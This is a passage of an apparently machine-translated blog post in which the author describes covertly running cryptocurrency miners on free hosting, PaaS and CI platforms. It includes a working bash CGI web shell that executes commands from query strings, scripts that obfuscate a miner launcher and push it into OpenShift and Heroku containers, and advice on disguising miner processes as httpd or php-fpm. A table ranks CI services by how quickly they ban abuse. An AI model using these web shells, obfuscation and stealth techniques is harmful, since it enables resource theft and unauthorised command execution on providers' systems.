ไดเร็กทอรีด้วย a<code>b64</code> ลิงค์ในนั้น<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>ความแปลกประหลาดที่พบกับ bash ขณะเข้ารหัส miner คือการกำหนดตัวแปรด้วย subshell พร้อมเครื่องหมายคำพูด<code>myvar="$(something)"</code> ทำให้การใช้หน่วยความจำเพิ่มขึ้นอย่างถาวร ซึ่งยากต่อการดีบักและยังไม่พบสาเหตุที่ทำให้เกิดพฤติกรรมเช่นนี้ ถอดรหัสแทนเสร็จสิ้นด้วย<em> นี่สตริง</em> ซึ่งเป็นนามธรรมเหนือไฟล์ชั่วคราว ตัวแปรถูกทิ้งลงในไฟล์ที่ไปป์กลับเข้าสู่กระบวนการ<p>วงขุดเหมืองยาว:<ul><li><p>ในขณะที่จริง<ul><li><p>หยุดคนขุดแร่<li><p>ลบ config<li><p>เริ่มขุด<li><p>ในขณะที่จริง<ul><li><p>เริ่มภูต<ul><li><p>ในขณะที่คนงานเหมืองกำลังทำงาน<ul><li><p>อ่านผลลัพธ์จากคนงานเหมือง<li><p>เลือกการกระทำของคนงานเหมืองตามสายการส่งออก</ul></ul><li><p>ถ้าคนขุดแร่ไม่ทำงาน: พัง</ul><li><p>นอน</ul></ul><p>บรรทัดเอาต์พุตจับคู่กับ regex บางตัว:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>daemon จัดการกับกรณีที่<ul><li><p>การเชื่อมต่อกับปลายทางทำให้เกิดข้อผิดพลาด (เลือกปลายทางแบบสุ่มใหม่)<li><p>การเปลี่ยนแปลงอัลกอริธึมการแฮช (ปรับเวลาพักเครื่องและการกำหนดค่าเฉพาะกิจ)<li><p>ปัญหาคนขุดแร่ (เริ่มตัวขุดใหม่)</ul><p>มีการสนับสนุนสำหรับแดชบอร์ดคำสั่งและแผงควบคุมอยู่พักหนึ่ง ซึ่งอนุญาตให้ทริกเกอร์การรีสตาร์ทด้วยตนเอง อย่างไรก็ตาม เนื่องจากการใช้งานมีน้อย จึงถูกยกเลิก และปลายทางถูกแทนที่ด้วยการเชื่อมต่อพูลสำรอง กระบวนการรีสตาร์ทจึงไม่เสถียรและซับซ้อน ..อีกกรณีหนึ่งของหนี้เทคโนโลยี อย่างไรก็ตาม อนุญาตให้ดึงข้อมูลเพย์โหลดที่อัปเดตใหม่อีกครั้งและตั้งค่าการกำหนดค่าทั้งหมดใหม่ได้ทันที ซึ่งยอดเยี่ยมมาก แทรมโพลีนที่ดีที่สุด<h2 id=debugging><a class=header-anchor href=#debugging> แก้จุดบกพร่อง</a></h2><p>มีสามยูทิลิตี้หลัก<ul><li><p>เปิด / ปิดการติดตามรอบ ๆ บล็อกโค้ด (เราไม่ต้องการติดตามไบนารีที่เข้ารหัส b64 ในตัวแปร..)<li><p>ฟังก์ชันง่าย ๆ สำหรับการจัดรูปแบบบันทึก<li><p>แฟล็กที่จะเปิดใช้งานการบันทึก verbose ที่รันไทม์ทุกครั้งที่เริ่มการขุด<ul><li><p>ทำไฟล์<code>.debug</code> มีอยู่?<ul><li><p>เปิดใช้งานการบันทึกอย่างละเอียด</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> การปรับใช้เป้าหมาย</a></h2><p>การตั้งค่านี้ได้รับการทดสอบบนโฮสต์ 3 ประเภท:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> คอนเทนเนอร์ที่โฮสต์เองหรือ VM</a></h3><p>ผู้ให้บริการโฮสต์หลายรายไม่ชอบการขุดเนื่องจากทรัพยากรของ CPU มักจะถูกแชร์ระหว่างผู้ใช้หลายราย และซอฟต์แวร์การขุดสามารถชะลอโฮสต์โหนดที่ส่งผลกระทบต่อประสิทธิภาพการทำงานของผู้ใช้ที่เหลือได้อย่างง่ายดาย สิ่งนี้สามารถเป็นจริงได้แม้ว่าเวลาของผู้ใช้ CPU จะไม่จำกัด เนื่องจากอัลกอริธึมการแฮชสามารถทำให้เลเยอร์การแคชทั้งหมดของ CPU อิ่มตัวได้ หากแคชถูกแชร์ระหว่างคอร์ของ CPU ทั้งหมด<p>เราต้องการใช้ของเรา<em> ยุติธรรม</em> แบ่งปันทรัพยากรโดยไม่ได้รับการแบนนั่นเป็นกรณีการใช้งานที่ดีสำหรับหยดการลักลอบของเราเนื่องจากเป็นการรับรู้การใช้งานโฮสต์ซึ่งหมายความว่า<em> ควร</em> อยู่ในประเภท [AUP] ไม่มีขั้นตอนเพิ่มเติมในการจัดการกับการปรับใช้ที่โฮสต์ด้วยตนเอง เพียงแค่สคริปต์ตัวเรียกใช้งาน อาจถูกเพิ่มไปยังลำดับการบูตหรือเปิดใช้งานด้วยตนเอง<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> เว็บโฮสติ้งที่ใช้ cPanel</a></h3><p>แผนการสมัครสมาชิกเว็บโฮสติ้งส่วนใหญ่จะเสนอผ่าน [cPanel] อีกครั้งที่เราใช้แผนการสมัครสมาชิกส่วนบุคคลซึ่งมีการจำกัดทรัพยากรที่สมเหตุสมผล ในทางกลับกัน แผนฟรีใดๆ ก็มีข้อจำกัดที่ไร้สาระ<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel ให้คุณกำหนดตัวจัดการสำหรับนามสกุลไฟล์ต่างๆ ได้ ซึ่งช่วยให้เราเรียกใช้เชลล์สคริปต์ผ่าน<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> ด้วยคำขอ http เทียบกับเชลล์สคริปต์ที่อัปโหลดบนเซิร์ฟเวอร์ อินเทอร์เฟซประเภทนี้มีลักษณะเหมือนเว็บเชลล์<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . เปลือกเว็บทุบตีอย่างง่าย<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>ควรใช้บิวด์อินเพียงอย่างเดียวเนื่องจากการฟอร์กกระบวนการเพิ่มเติมอาจไม่ได้รับอนุญาตในเว็บคุก แต่ทำได้เสมอ<code>exec</code> ซึ่งช่วยให้เราใช้ยูทิลิตี้บรรทัดคำสั่งส่วนใหญ่ได้ เว็บเชลล์ส่วนใหญ่เขียนด้วยภาษาสคริปต์อื่นๆ เช่น python หรือ php เนื่องจากคุณไม่ต้องกังวลกับการฟอร์ก<p>ในสภาพแวดล้อม cpanel ควรใช้ชื่อคงที่สำหรับกระบวนการขุดเช่น<code>httpd</code> หรือ<code>php-fpm</code> เพราะ<code>cgi</code> ขึ้นอยู่กับการประมวลผลหลายตัว ดังนั้นเซิร์ฟเวอร์จึงเต็มไปด้วยกระบวนการมากมายที่มีชื่อเช่นนี้ แม้ว่าผู้สังเกตการณ์อย่างระมัดระวังควรสังเกต<em> มัลติเธรด</em> รูปแบบการใช้งานที่ไม่ธรรมดา (หรือเป็นไปได้) อย่างแน่นอนสำหรับภาษาเช่น perl, php, ruby ​​หรือ python!<p>กระบวนการยังมีการจำกัดเวลาตามค่าเริ่มต้น (1 ชั่วโมง 1 วัน ฯลฯ) สำหรับสิ่งนี้ เราแค่ใช้งาน cron ที่รีสตาร์ท dropper<p>สิ่งนี้จำเป็นต้องมีการแก้ไขด้วยตนเองจำนวนมาก cpanel api เพื่อทำให้สิ่งนี้เป็นแบบอัตโนมัติ น่าเสียดายที่ผู้ใช้ปลายทางไม่ได้เปิดเผย ดังนั้นเว็บโฮสติ้งจึงเป็นเป้าหมายที่น่าเบื่อและน่าเบื่อสำหรับนักขุดของเรา<h3 id=web_environments><a class=header-anchor href=#web_environments> สภาพแวดล้อมของเว็บ</a></h3><p>มี<em> SaaS</em> ผู้ให้บริการที่มีโปรแกรมแก้ไขเว็บควบคู่ไปกับคอนเทนเนอร์ เช่น<a href="with a free tier before getting acquired by amazon"> cloud9</a> , [codeanywhere], [codenvy]. การปรับใช้ dropper ที่นี่เป็นเรื่องง่าย (คุณมีสภาพแวดล้อมที่สมบูรณ์) แต่การทำให้มันทำงานเป็นภาระ เนื่องจากตัวแก้ไขเว็บแบบโต้ตอบใดๆ จะยุติเซสชันทันทีหลังจากปิดหน้าเว็บ และคอนเทนเนอร์จะถูกพัก (เว้นแต่คุณ แน่นอนจ่าย)<p>การหลีกเลี่ยงสิ่งนี้หมายความว่าเราต้องเปิดเซสชันไว้ การเขียนสคริปต์ด้วย [puppeteer] บางอย่างได้ผลลัพธ์ตามที่ต้องการ แต่การใช้เวลานาน หน่วยความจำรั่ว หน้าเว็บ SPA ที่บวมนั้นไม่สวยและไม่ซ่อนเร้นอย่างแน่นอน เพราะจากแบ็กเอนด์ของผู้ให้บริการ เซสชั่นที่เปิด 24/7 จะดูน่าสงสัยอย่างแน่นอน แท้จริงแล้วสภาพแวดล้อมของเว็บยังเป็นเป้าหมายที่น่าเบื่อและน่าเบื่ออีกด้วย<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> บริการแอพฟรี</a></h3><p>นี่คือส่วนใหญ่<a href="when it used to have a free tier"> openshift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> และ [heroku] Openshift การเป็น kubernetes นั้นค่อนข้างตรงไปตรงมาในการปรับใช้ แต่เต็มไปด้วยการกำหนดค่าปั่นป่วน นี่คือข้อความที่ตัดตอนมา:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>นี่คือสคริปต์ที่ใช้สร้างคอนเทนเนอร์การขุดซึ่งต้องใช้เทมเพลต yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>แต่กระบวนการทั้งหมดเกี่ยวข้องกับขั้นตอนค่อนข้างมาก!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>ในรหัสหลอก:<ul><li><p>สร้างโครงการ<li><p>สร้างแอปพลิเคชันโดยไม่มีรูปภาพ<li><p>สร้างตู้ทำเหมือง<li><p>ปรับใช้คอนเทนเนอร์ด้วยการกำหนดค่าการปรับใช้ (นามธรรม kubernetes)<li><p>เปิดตัวการทำให้ใช้งานได้</ul><p>NS<code>build-build</code> สคริปต์สร้างแทน a<em> สร้าง</em> ตู้คอนเทนเนอร์ซึ่งจะขุดครั้งละสองสามชั่วโมง บิลด์และพ็อดปกติมีทรัพยากรแยกกันใน openshift ดังนั้นเราจึงใช้ประโยชน์จากทั้งสองอย่าง Openshift โดยรวมแล้วเป็นประสบการณ์ที่แย่ เนื่องจากมีการเผยแพร่มากกว่า 4 รุ่นที่แตกต่างกัน (อาจจะมากกว่านั้น ฉันหยุดติดตามหลังจากผ่านไประยะหนึ่ง) และแต่ละอันจำเป็นต้องเปลี่ยนแปลงการกำหนดค่า พวกเขาไม่มีเส้นทางการอัพเกรดและทุกอย่างถูกทำซ้ำอย่างรวดเร็ว และเป็นเรื่องปกติ เพื่อให้บิลด์/พ็อดหยุดทำงาน และไม่ใช่การเก็บขยะ...พวกเขามักจะทำการรีสตาร์ทแบบแมนนวลเป็นระยะๆ บางที kubernetes อาจเป็นแค่บั๊ก :)<p>การกำหนดค่า Heroku นั้นง่ายกว่าเล็กน้อย (ไม่เกี่ยวข้องกับ kubernetes) นอกเหนือจากการสร้างคอนเทนเนอร์ซึ่งคล้ายกับ openshift อันหนึ่ง ส่วนที่เหลือเป็นเพียงคำสั่ง cli สองคำสั่ง<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>คอนเทนเนอร์ถูกผลักโดยตรงโดยนักเทียบท่าไปยังรีจิสตรีของ heroku<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> ความขัดแย้งกับ heroku (ซึ่งระดับฟรียังคงยืนหยัดจนถึงเวลาที่เขียน) คือ dynos สามารถทำงานได้เพียง 22 วันต่อเดือนเท่านั้น ดังนั้นพวกเขาจึงต้องมีการจัดการด้วยตนเองในแต่ละเดือน ซึ่งยุ่งยากและน่าเบื่ออีกครั้ง พวกเขาดำเนินการแบนคลื่นบางช่วงในตอนเริ่มต้น และจากนั้นพวกเขาปิดใช้งานการลงทะเบียนผ่าน TOR ฉันค่อนข้างแน่ใจว่าฉันเป็นต้นเหตุของสิ่งนี้<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> คอนเทนเนอร์ CI หรือ VM</a></h3><p>สิ่งเหล่านี้เป็นเป้าหมายที่เชื่อมโยงกันมากที่สุดสำหรับหลอดหยดของเรา มีมากมาย<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> บริษัทหลายแห่งกำลังเผาเงินของนักลงทุนโดยเสนอระดับฟรีโดยหวังว่าจะได้ส่วนแบ่งการตลาดในธุรกิจโครงสร้างพื้นฐานด้านเทคโนโลยี<p>บริการทั้งหมดเหล่านี้มีทรัพยากรที่แตกต่างกัน มีข้อกำหนดการกำหนดค่าที่แตกต่างกัน และทำงานในสภาพแวดล้อมที่แตกต่างกัน ฉันไม่เคยคิดที่จะลงทะเบียนบัญชีแบบอัตโนมัติเพราะว่าสิ่งเหล่านี้เป็นโปรแกรมที่น่ากลัว ฉันพยายามหลีกเลี่ยงพวกเขาตลอดเวลา ดังนั้นฉันจึงต้องอดทนกับการลงทะเบียนด้วยตนเองอยู่พักหนึ่ง เนื่องจากฉันอยากรู้ว่าฉันจะได้รับคำตอบต่อต้านสแปมแบบใด (และ แตกต่างจากที่อื่นอย่างไร!). คุณสามารถคาดเดาบางสิ่งเกี่ยวกับการจัดการของบริษัทได้จากวิธีจัดการกับสแปม:<ul><li><p>มันทำการแบนเวฟหรือไม่? จากนั้นพวกเขาก็มีนโยบายที่ไม่เข้มงวด ปัญหาจะได้รับการจัดการด้วยตนเองและเป็นกรณี ๆ ไป<li><p>ต้องมีการยืนยันทางโทรศัพท์หรือไม่ พวกเขาเคยถูกทารุณกรรมในอดีต<li><p>พวกเขาตอบสนองต่อการใช้ทรัพยากรจำนวนมากหรือไม่? พวกเขากำลังดำเนินการด้วยงบประมาณที่ จำกัด<li><p>พวกเขาใช้การจำกัดบัญชีหรือการแบนเงาหรือไม่? ถ้าพวกเขาเงาแบน แสดงว่ามีผู้ดูแลระบบที่ใจร้าย</ul><p>นอกจากนี้ยังมีคำถามเชิงปรัชญาอีกด้วย: หากบริการอนุญาตให้คุณใช้ระบบในทางที่ผิดเป็นเวลานาน หมายความว่าพวกเขามีโครงสร้างพื้นฐานระดับบนสุดที่สามารถรองรับโหลดได้ หรือเพียงแค่ควบคุมระบบได้ไม่ดี และคุณต้องพิจารณาถึงความสมดุลระหว่างความสามารถในการเข้าถึงและการรักษาความปลอดภัย ระบบที่มีความปลอดภัยสูงเกินไปสามารถลดการรักษาผู้ใช้ได้<p>นี่คือตารางที่แสดงบริการบางอย่างที่ฉันปรับใช้:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ชิ<th style=text-align:center>การกำหนดค่า<th style=text-align:center>ประสิทธิภาพ<th style=text-align:center>แบนค้อน<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>แย่<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:#ff0;text-align:center>ปานกลาง<tr><td style=text-align:center>ทราวิส<td style=color:green;text-align:center>ดี<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:green;text-align:center>ดี<tr><td style=text-align:center>การเข้ารหัส<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:red;text-align:center>แย่<td style=color:#ff0;text-align:center>ปานกลาง<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:green;text-align:center>ดี<td style=color:green;text-align:center>ดี<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>แย่<td style=color:green;text-align:center>ดี<td style=color:#ff0;text-align:center>ปานกลาง<tr><td style=text-align:center>สัญญาณ<td style=color:green;text-align:center>ดี<td style=color:green;text-align:center>ดี<td style=color:#ff0;text-align:center>ปานกลาง<tr><td style=text-align:center>นักเทียบท่า<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:green;text-align:center>ดี<tr><td style=text-align:center>ท่าเรือ<td style=color:green;text-align:center>ดี<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:#ff0;text-align:center>ปานกลาง<tr><td style=text-align:center>โค้ดเฟรช<td style=color:red;text-align:center>แย่<td style=color:green;text-align:center>ดี<td style=color:#ff0;text-align:center>ปานกลาง<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:red;text-align:center>แย่<tr><td style=text-align:center>Azure-ไปป์ไลน์<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:red;text-align:center>แย่<tr><td style=text-align:center>ต่อเนื่องphp<td style=color:red;text-align:center>แย่<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:#ff0;text-align:center>ปานกลาง<tr><td style=text-align:center>เพื่อน<td style=color:red;text-align:center>แย่<td style=color:red;text-align:center>แย่<td style=color:red;text-align:center>แย่<tr><td style=text-align:center>โดรน<td style=color:red;text-align:center>แย่<td style=color:green;text-align:center>ดี<td style=color:red;text-align:center>แย่<tr><td style=text-align:center>Appveyor<td style=color:red;text-align:center>แย่<td style=color:#ff0;text-align:center>ปานกลาง<td style=color:red;text-align:center>แย่<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>แย่<td style=color:green;text-align:center>ดี<td style=color:#ff0;text-align:center>ปานกลาง<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>แย่<td style=color:green;text-align:center>ดี<td style=color:red;text-align:center>แย่</table><p>ในบริบทนี้ a<span style=color:green> ดี</span> การกำหนดค่าหมายความว่าใช้เวลาไม่นานในการกำหนดค่า a<code>ci</code> งานสำหรับกระบวนการขุด (เช่นบริการทั้งหมดที่อาศัยแดชบอร์ดเว็บแทนที่จะเป็นไฟล์ dot ที่เก็บเป็นงานที่น่าเบื่อ)<span style=color:red> แย่</span><code>ban-hammer</code> หมายความว่าการลงทะเบียนใช้บริการนั้นยาก 